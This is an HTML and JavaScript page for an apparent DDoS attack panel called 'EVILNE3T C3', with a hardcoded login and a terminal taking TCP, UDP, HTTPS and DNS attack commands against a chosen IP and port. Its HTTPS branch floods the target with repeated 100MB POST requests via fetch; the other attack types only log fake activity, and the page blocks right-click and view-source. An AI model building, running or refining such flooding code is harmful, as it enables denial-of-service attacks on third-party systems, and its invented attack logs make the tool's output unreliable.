<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>EVILNE3T C3</title>
    <style>
        body {
            font-family: 'Courier New', Courier, monospace;
            margin: 0;
            padding: 0;
            background-color: black;
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            color: white;
            text-align: center;
            padding-top: 50px;
            height: 100%;
            overflow: auto;
            position: relative;
        }

        /* Terminal Display */
        #terminal {
            width: 80%;
            max-width: 1000px;
            height: 400px;
            margin: 50px auto; /* Centers the terminal */
            padding: 20px;
            color: yellow; /* Text color set to yellow */
            font-size: 18px;
            white-space: pre-wrap;
            word-wrap: break-word;
            text-align: left; /* Align the text to the left */
            background: none; /* No background */
            border: none; /* No border */
            box-shadow: none; /* No shadow */
        }

        /* Command Input field at the top */
        #commandInput {
            background-color: black;
            border: none;
            color: yellow;
            font-family: 'Courier New', Courier, monospace;
            font-size: 18px;
            width: 80%;
            margin-top: 10px;
            margin-bottom: 20px;
            text-align: left;
        }

        /* Christmas Snowflakes */
        @keyframes snowflakes {
            0% { transform: translateY(-100px); }
            100% { transform: translateY(100vh); }
        }

        .snowflake {
            position: absolute;
            top: -10px;
            color: white;
            font-size: 24px;
            z-index: 9999;
            animation: snowflakes 10s linear infinite;
        }

        .snowflake:nth-child(odd) {
            animation-duration: 15s;
            animation-timing-function: linear;
        }

        .snowflake:nth-child(even) {
            animation-duration: 20s;
            animation-timing-function: linear;
        }

        /* Neon border effect for logs */
        #logContainer {
            background-color: rgba(0, 0, 0, 0.8);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 255, 255, 0.8);
            color: yellow;
            font-size: 18px;
            max-height: 300px;
            overflow-y: auto;
            margin-top: 20px;
            white-space: pre-wrap; /* Preserve newlines */
            word-wrap: break-word; /* Allow long words to break */
            display: block;
        }

        .log-entry {
            margin-bottom: 10px; /* Adds space between logs */
            padding: 5px;
            border: 1px solid #444; /* Gives a border to the block */
            border-radius: 5px;
            background-color: rgba(0, 0, 0, 0.6); /* Slightly darkened background */
        }

        .log-entry span {
            color: #ff6600; /* Highlight the type in orange */
        }

        /* Login Form */
        .container {
            margin: 20px auto;
            width: 80%;
            max-width: 1000px;
            background-color: rgba(0, 0, 0, 0.7);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.8);
        }

        .label-input-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 10px 0;
        }

        input[type="text"],
        input[type="password"] {
            background-color: #333;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            font-size: 16px;
            margin-top: 10px;
            border-radius: 5px;
        }

        .button {
            background-color: #ff6600;
            color: white;
            padding: 15px 25px;
            border: none;
            font-size: 18px;
            cursor: pointer;
            border-radius: 5px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>

    <!-- Snowflakes -->
    <div class="snowflake" style="left: 10%;">❄</div>
    <div class="snowflake" style="left: 20%;">❄</div>
    <div class="snowflake" style="left: 30%;">❄</div>
    <div class="snowflake" style="left: 40%;">❄</div>
    <div class="snowflake" style="left: 50%;">❄</div>
    <div class="snowflake" style="left: 60%;">❄</div>
    <div class="snowflake" style="left: 70%;">❄</div>
    <div class="snowflake" style="left: 80%;">❄</div>
    <div class="snowflake" style="left: 90%;">❄</div>

    <!-- Login Form -->
    <div id="loginPage" class="container">
        <h2>EVILNE3T C3</h2>
        <div class="label-input-container">
            <input type="text" id="username" placeholder="Enter Username">
        </div>
        <div class="label-input-container">
            <input type="password" id="password" placeholder="Enter Password">
        </div>
        <button class="button" onclick="login()">Login</button>
    </div>

    <!-- Main Content (hidden initially) -->
    <div id="mainContent" class="container" style="display: none;">
        <div id="logContainer">
            <!-- Logs will be added dynamically via JS -->
        </div>

        <!-- Command Input field (now at the top) -->
        <input type="text" id="commandInput" placeholder="Type command" onkeydown="handleCommand(event)"><br>
    </div>

    <script>
        const users = {
            "sin66": "sin0010"
        };

        let currentUser = "";
        let attackTimer = null;

        // Function to handle login
        function login() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            if (users[username] && users[username] === password) {
                currentUser = username;
                // Clear the terminal content
                const terminal = document.getElementById('logContainer');
                terminal.textContent = ''; // Clear the logs
                document.getElementById('loginPage').style.display = 'none';
                document.getElementById('mainContent').style.display = 'block';
                log('Login Successful', `Welcome, ${username}!`);
            } else {
                alert('Invalid username or password.');
            }
        }

        // Block "view page source"
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
        });

        document.addEventListener('keydown', function(e) {
            if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
                e.preventDefault();
                alert('WTF BOY YOU TRY TO SHOW SOURCE COD ????');
            }
        });

        // Function to handle commands in terminal
        function handleCommand(event) {
            if (event.key === 'Enter') {
                const command = document.getElementById('commandInput').value.trim();
                document.getElementById('commandInput').value = ''; // Clear the input field

                if (command.startsWith('TCP ')) {
                    startAttack('TCP', command.slice(4));
                } else if (command.startsWith('TSOCKET ')) {
                    startAttack('TSOCKET', command.slice(8));
                } else if (command.startsWith('HTTPS ')) {
                    startAttack('HTTPS', command.slice(6));
                } else if (command.startsWith('UDP ')) {
                    startAttack('UDP', command.slice(4));
                } else if (command.startsWith('DNS ')) {
                    startAttack('DNS', command.slice(4));
                } else if (command === 'info') {
                    log('INFO', 'EVILN3T C3 | FOUNDER : RAY | SINCE : 2023');
                } else if (command === 'ma') {
                    log('INFO', 'NIK OMHOM ( lmoghriib )');
                } else if (command === 'help') {
                    log('HELP', 'Available commands: TCP <ip> <port>, TSOCKET <ip>, HTTPS <url>, UDP <ip> <port>, DNS <domain>, info, ma');
                } else {
                    log('ERROR', 'Invalid command');
                }
            }
        }

        // Function to simulate attack with faster requests and larger payloads
        function startAttack(type, target) {
            const [targetIp, targetPort] = target.split(' ');

            if (attackTimer) {
                clearInterval(attackTimer); // Clear any previous attack
            }

            log('ATTACK', `[ATTACKING STARTED On ${targetIp}:${targetPort}]`);
            let timeLeft = 60; // Default attack time: 60 seconds
            let attackSpeed = 10; // Send requests every 10ms (simulate 100MB/sec)

            attackTimer = setInterval(() => {
                // Send multiple requests in parallel with large payload
                sendAttackRequest(type, targetIp, targetPort); // Request 1
                sendAttackRequest(type, targetIp, targetPort); // Request 2
                sendAttackRequest(type, targetIp, targetPort); // Request 3

                timeLeft--;
                if (timeLeft <= 0) {
                    clearInterval(attackTimer);
                    log('ATTACK', 'Attack finished');
                }
            }, attackSpeed); // Speed controlled by attackSpeed value
        }

        // Function to send a large attack request
        function sendAttackRequest(type, targetIp, targetPort) {
            let payload = generateLargePayload(); // Generate large payload

            if (type === 'TCP') {
                log('ATTACK', `TCP request sent to ${targetIp}:${targetPort} with payload size: ${payload.length}`);
                // Simulate a TCP request (for actual TCP use backend solution)
            } else if (type === 'UDP') {
                log('ATTACK', `UDP request sent to ${targetIp}:${targetPort} with payload size: ${payload.length}`);
                // Simulate a UDP request (for actual UDP use backend solution)
            } else if (type === 'HTTPS') {
                log('ATTACK', `HTTPS request sent to ${targetIp}:${targetPort} with payload size: ${payload.length}`);
                // Simulate HTTPS request with fetch
                fetch(`http://${targetIp}:${targetPort}`, {
                    method: 'POST',
                    body: payload,
                    headers: { 'Content-Type': 'application/json' }
                }).catch(err => console.log('HTTPS Request Error: ', err));
            }
        }

        // Function to generate a large payload (100MB)
        function generateLargePayload() {
            let largePayload = '';
            const payloadSize = 100 * 1024 * 1024; // 100MB
            for (let i = 0; i < payloadSize; i++) {
                largePayload += 'A'; // Repeating 'A' to create a larger payload
            }
            return largePayload;
        }

        // Function to log output in terminal
        function log(type, message) {
            const logContainer = document.getElementById('logContainer');
            
            const logEntry = document.createElement('div');
            logEntry.className = 'log-entry';

            logEntry.innerHTML = `<span>[${type}]</span> ${message}`;
            logContainer.appendChild(logEntry);

            // Ensure the log container scrolls to the bottom
            logContainer.scrollTop = logContainer.scrollHeight;
        }
    </script>
</body>
</html>
